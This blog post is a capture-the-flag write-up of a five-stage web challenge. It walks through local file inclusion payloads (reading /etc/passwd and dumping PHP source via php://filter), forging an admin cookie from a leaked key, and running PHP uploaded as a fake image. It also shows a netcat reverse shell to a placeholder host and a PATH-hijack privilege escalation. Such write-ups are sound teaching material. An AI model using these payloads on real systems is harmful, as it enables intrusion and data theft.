---
layout: post
title: 24@CTF - Jamais Sans Mon Riz
date: 2022-02-06
type: post
tags:
- Writeup
- Hacking
- 24hCTF
- CTF
permalink: /2022/02/24hCTFJamaisSansMonRiz
img: 2022/02/24hCTF/PolyHx.png
---

This weekend, I participated in the second edition of the [24h@CTF](https://polyhx.ctfd.io/). I did not have much free time so I focused on the web track. I lost a lot of time on a challenge by [Yogosha](https://blog.yogosha.com/en) that I failed to solve. [Desjardins](https://www.desjardins.com/) had a fun series of five web challenges called 'Jamais Sans Mon Riz' (Never Without My Rice). This is how I solved them. 

![Challenge Description](/assets/images/2022/02/24hCTF/ChallengeDescription.png "Challenge Description")

``` 
Come and learn about your true passion served with a side of challenging web vulnerabilities.

A full web track with many challenges of progressing difficulty, for beginner to expiriced players.

http://www.jamaissansmonriz.com/
``` 



## Flag #1

I opened the given URL and got the following site. 

![Main Site](/assets/images/2022/02/24hCTF/MainSite.png "Main Site")

The site is in French. But it did not really matter for those who don't read French. I did not see any hints in the content. 

I started looking around the site. I inspected every requests in Burp and did not see the first flag. I found a potential [LFI vulnerability](https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/). But at first glance I did not see which file I needed to read to get a flag. 

Then I launched GoBuster to look for hidden files on the server. 

```bash
$ gobuster dir -e -u http://www.jamaissansmonriz.com/ -t30 -w /usr/share/dirb/wordlists/common.txt  -xjs,txt,php


===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://www.jamaissansmonriz.com/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              js,txt,php
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2022/02/06 14:05:47 Starting gobuster in directory enumeration mode
===============================================================
http://www.jamaissansmonriz.com/.htpasswd            (Status: 403) [Size: 289]
http://www.jamaissansmonriz.com/.hta.txt             (Status: 403) [Size: 289]
http://www.jamaissansmonriz.com/.htpasswd.js         (Status: 403) [Size: 289]
http://www.jamaissansmonriz.com/.hta.php             (Status: 403) [Size: 289]
http://www.jamaissansmonriz.com/.htpasswd.txt        (Status: 403) [Size: 289]
http://www.jamaissansmonriz.com/.hta                 (Status: 403) [Size: 289]
http://www.jamaissansmonriz.com/.htpasswd.php        (Status: 403) [Size: 289]
http://www.jamaissansmonriz.com/.hta.js              (Status: 403) [Size: 289]
http://www.jamaissansmonriz.com/about.php            (Status: 200) [Size: 6793]
http://www.jamaissansmonriz.com/admin                (Status: 301) [Size: 336] [--> http://www.jamaissansmonriz.com/admin/]
http://www.jamaissansmonriz.com/.htaccess.php        (Status: 403) [Size: 289]                                             
http://www.jamaissansmonriz.com/.htaccess            (Status: 403) [Size: 289]                                             
http://www.jamaissansmonriz.com/.htaccess.js         (Status: 403) [Size: 289]                                             
http://www.jamaissansmonriz.com/.htaccess.txt        (Status: 403) [Size: 289]                                             
http://www.jamaissansmonriz.com/assets               (Status: 301) [Size: 337] [--> http://www.jamaissansmonriz.com/assets/]
http://www.jamaissansmonriz.com/contact.php          (Status: 200) [Size: 6965]                                             
http://www.jamaissansmonriz.com/css                  (Status: 301) [Size: 334] [--> http://www.jamaissansmonriz.com/css/]   
http://www.jamaissansmonriz.com/favicon.ico          (Status: 200) [Size: 23462]                                            
http://www.jamaissansmonriz.com/footer.php           (Status: 200) [Size: 1898]                                             
http://www.jamaissansmonriz.com/header.php           (Status: 200) [Size: 1163]                                             
http://www.jamaissansmonriz.com/img                  (Status: 301) [Size: 334] [--> http://www.jamaissansmonriz.com/img/]   
http://www.jamaissansmonriz.com/index.php            (Status: 200) [Size: 8121]                                             
http://www.jamaissansmonriz.com/index.php            (Status: 200) [Size: 8121]                                             
http://www.jamaissansmonriz.com/js                   (Status: 301) [Size: 333] [--> http://www.jamaissansmonriz.com/js/]
http://www.jamaissansmonriz.com/posts                (Status: 301) [Size: 336] [--> http://www.jamaissansmonriz.com/posts/]
http://www.jamaissansmonriz.com/post.php             (Status: 200) [Size: 10070]
http://www.jamaissansmonriz.com/robots.txt           (Status: 200) [Size: 64]
http://www.jamaissansmonriz.com/robots.txt           (Status: 200) [Size: 64]
http://www.jamaissansmonriz.com/server-status        (Status: 403) [Size: 289]

===============================================================
2022/02/06 14:06:06
===============================================================                                   
```

I realized at that moment that I had not looked for a `robots.txt` file. I opened it and the first flag was there. 

```
User-agent: * 
Disallow: /admin/

FLAG{1_dur_dur_detre_un_robot}
```

## Flag #2

For the second flag, I used the LFI vulnerability. When clicking on post, we were taken to a URL that had a parameter `postid` with a PHP file as the value: http://www.jamaissansmonriz.com/post.php?postid=posts/1.php . 

I immediately tried to include `/etc/passwd`. 

http://www.jamaissansmonriz.com/post.php?postid=/etc/passwd

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
admin:x:1000:1000::/home/admin:/bin/sh
```

It worked, but it did not contains anything of interest. I tried loading the Apache logs to see if I could use it to do some log poisoning. It did not work. 

Next I used the LFI vulnerability to extract the PHP files. This is not a simple to do as using `postid=index.php`. If you include a PHP file like this, it will be interpreted and the server will return the result of that execution instead of the code. Luckily, the PHP filters allow us to get the PHP code as base64. 

I loaded the PHP file with http://www.jamaissansmonriz.com/post.php?postid=php://filter/convert.base64-encode/resource=index.php . Then I saved the base64 string into a file and decoded it. 

```bash
base64 -d index.b > index.php
```

I used the same technique to extract the code of every PHP file on the server. When I got to `/admin/login.php`, the second flag was in the comment on the top of the file. 

```php
<?php

// FLAG{2_je_me_sens_tellement_inclu}
```

## Flag #3

For the next step, I read the code to the login form. 

```php
<?php

// FLAG{2_je_me_sens_tellement_inclu}

include_once("lib/crypto.php");
session_start();

if(isset($_SESSION["admin"]) && $_SESSION["admin"]) {
    header("Location: /admin/index.php");
    exit();
}

// Validate Remember Me
if(isset($_COOKIE["remember_me"])) {
    if ($remember_me = validate_remember_me_cookie($_COOKIE["remember_me"])) {
        $_SESSION["admin"] = true;
        $_SESSION["username"] = "admin";
        header("Location: /admin/index.php");
        exit();
    }
}


// Validate login

if(isset($_POST["email"]) && isset($_POST["password"])) {
    // TODO: Ajouter une base de donnees, comme ca on ne riz plus
    if($_POST["email"] === "admin@jamaissansmonriz.com" && $_POST["password"] === getenv("FLAG4")) {
        
        $_SESSION["admin"] = true;
        $_SESSION["username"] = "admin";

        if(isset($_POST["remember_me"]) && $_POST["remember_me"] === "on") {
            setcookie("remember_me", generate_remember_me_cookie($_SESSION["username"], "1"), time()+3600*24*30, "/", "", 0);
        }   
        header("Location: /admin/index.php");
        exit();
    }
}
?>
```

It gave me the admin's email. But the password was hidden in a environment variable and I could not read it. 

The `remember_me` cookie looked like it could be used to bypass the login code. I looked at the code used to generate it. 

```php
<?php

$key = "5UP3R_S3CURE,K3Y";
$cipher="AES-128-CBC";

function generate_remember_me_cookie($username, $admin) {
    $iv = substr(md5(mt_rand()), 0, 16);
    $t = time() + (3600 * 24 * 365);
    $data = $username . "|" . $t . "|" . $admin;
    return base64_encode(encrypt($data, $iv) . "|" . $iv);
}
```

I had the secret key, so I could use that function to generate the cookie value. 

```php
<?php
include_once("crypto.php");

echo generate_remember_me_cookie('admin', "1") . "\n";
```

```bash
$ php getCookie.php 
V2E0amJaMUVha25LL29VbDdnMldhNER2cmdNWFZxUWRFck5wVWhBdGtBdz18ZTFkMjNmZDFlZDAxNGE4Yw==
```

I used the generated value to the the `remember_me` cookie and I was connected as the admin of the site. 

The third flag was displayed there: FLAG{3_you_get_a_token_you_get_a_token_you_get_a_token} 

![Admin](/assets/images/2022/02/24hCTF/admin.png "Admin")

## Flag #4

The admin section had a way to upload files. 

![Uploads](/assets/images/2022/02/24hCTF/uploads.png "Uploads")

I looked at the code for the file uploads. 


```php
 <?php
    if (isset($_FILES['file'])) {
        $uploaddir = '/var/www/uploads/' . session_id() . '/';
        $path_parts = pathinfo($_FILES['file']['name']);
        $filename = $path_parts['basename'];
        $valid_ext = ["jpg", "png"];
        if(in_array($path_parts['extension'], $valid_ext, true)) {
            if (!file_exists($uploaddir)) {
                mkdir($uploaddir, 0755, true);
            }
            $uploadfile = $uploaddir . $filename;
            
            if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
                echo '<div class="alert alert-success" role="alert"> File is valid, and was successfully and securely uploaded.</div>';
            } else {
                echo '<div class="alert alert-danger" role="alert">What did you do... I\'m not mad, I\'m just disappointed...</div>';
            }
        } else {
            echo '<div class="alert alert-danger" role="alert">What did you do... I\'m not mad, I\'m just disappointed...</div>';
        }
    }
?>
```

This code validate that you only upload files with a .jpg or .png extension. If you do it takes the file and move it to `/var/www/uploads/YOUR_SESSION_ID`. 

The code tries to prevent code execution by forcing image files and moving them outside the web root folders. Those measures are easily bypassed with the LFI vulnerability. I can use it to read almost any file on the server. And since the file is read with `include()`, the extension does not matter. Any PHP code in the file will be executed. 

I create a small file called test.jpg to display the content of the `FLAG4` environment variable. 

```php
<?php
echo getenv("FLAG4");
```

Then I navigated to http://www.jamaissansmonriz.com/post.php?postid=/var/www/uploads/28dcoe1sgaiqigl3h1c8uqgpi1/test.jpg and the flag was displayed on the page. 

FLAG{4_good_job_devient_root_maintenant}

## Flag #5

For the last flag, I needed to get access to the server and become root. I used the same vulnerabilities as before to get a reverse shell. 

I modified my fake image to launch the reverse shell. 

```php
<?php
`mkfifo /tmp/kirxhbg; nc MY_IP 4444 0</tmp/kirxhbg | /bin/sh >/tmp/kirxhbg 2>&1; rm /tmp/kirxhbg`;
```

On my server I stated a netcat listener. 

```bash
nc -lnvp 4444
```

I then used the LFI to open the fake image and I got a connection on my listener. 

I looked around the server and found two interesting files on the root path. 

```bash
$ ls -la /
...
-rw-rw-r--   1 root root   128 Feb  5 12:24 my_very_special_script.c
-r-sr-xr-x   1 root root 16760 Feb  5 12:26 my_very_special_script.o
...


$ cat /my_very_special_script.c

#include <unistd.h>
#include <stdlib.h>

int main() {
    setuid(1000);
    system("touch /tmp/hello_world");
    return 0; 
}
```

The file `my_very_special_script.o` has the suid bit set. That means that when executed, it will run as the group that owns it (root). The first line set the current user to admin (user id 1000). And the next one call `touch` to create a file. Not very interesting. 

However, `touch` is called without the full path. This means that if I have an excutable file called touch on my path before the realy one, my version will be executed. 

I created a file called touch in a temporary folder, and added that folder to my PATH environement variable. When I ran `my_very_special_script`, my version of touch was executed. This gave me a shell as the user admin.

```bash
$ mktemp -d
/tmp/tmp.fkwmMm064U

$ cd /tmp/tmp.fkwmMm064U

$ cat touch  
#!/bin/bash
sh

$ chmod +x touch
$ chmod +x .

$ /my_very_special_script.o

$ whoami
admin

$ ls -la /home/admin
total 24
dr-x------ 1 admin admin 4096 Feb  5 11:26 .
drwxr-xr-x 1 root  root  4096 Feb  5 11:26 ..
-rw-r--r-- 1 admin admin  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 admin admin 3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 admin admin  807 Feb 25  2020 .profile
-r--r--r-- 1 root  root    36 Feb  5 11:26 flag.txt
$ cat /home/admin/flag.txt
FLAG{5_la_track_est_enfin_finie_gj}
```



```
